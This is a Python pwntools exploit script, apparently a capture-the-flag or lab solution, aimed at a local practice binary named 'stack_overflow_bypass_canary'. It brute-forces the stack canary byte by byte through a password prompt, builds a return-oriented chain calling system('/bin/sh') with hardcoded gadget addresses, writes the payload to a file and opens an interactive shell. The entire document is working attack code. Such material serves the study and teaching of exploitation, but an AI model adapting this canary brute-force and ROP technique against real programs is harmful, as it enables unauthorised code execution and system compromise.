#!/usr/bin/env python3

from pwn import *

system_plt = 0x401130
pop_rdi_ret = 0x004012cd
ret = 0x0040101a
bin_sh = 0x402004

def find_next_byte(payload):
    for i in range(256):
        next_byte = bytes([i])
        test_payload = payload + next_byte
        p.send(test_payload)
        output = p.recvuntil(b"Enter a password")
        #print(output)
        if "Authentication" in output.decode():
            print(f"[+] Found right byte {hex(i)}")
            return next_byte
    print("[-] Failed to find right byte")
    exit()

p = process("./build/stack_overflow_bypass_canary")

#out = p.readline()
#canary = unhex(out.strip().decode('utf-8'))

p.clean()

offset = 'A' * 24
payload_to_canary = offset.encode()

canary = b''
for i in range(8):
    canary = canary + find_next_byte(payload_to_canary + canary)

print(f"Found canary value: {canary.hex()}")

payload_with_canary = payload_to_canary + canary
# Padding and RBP
payload_with_canary += b'\x42' * 24
payload_with_canary += p64(pop_rdi_ret)
payload_with_canary += p64(bin_sh)
payload_with_canary += p64(ret)
payload_with_canary += p64(system_plt)

with open('payload','wb') as payload:
    payload.write(payload_with_canary)

p.clean()
p.sendline(payload_with_canary)

p.clean()
p.interactive()
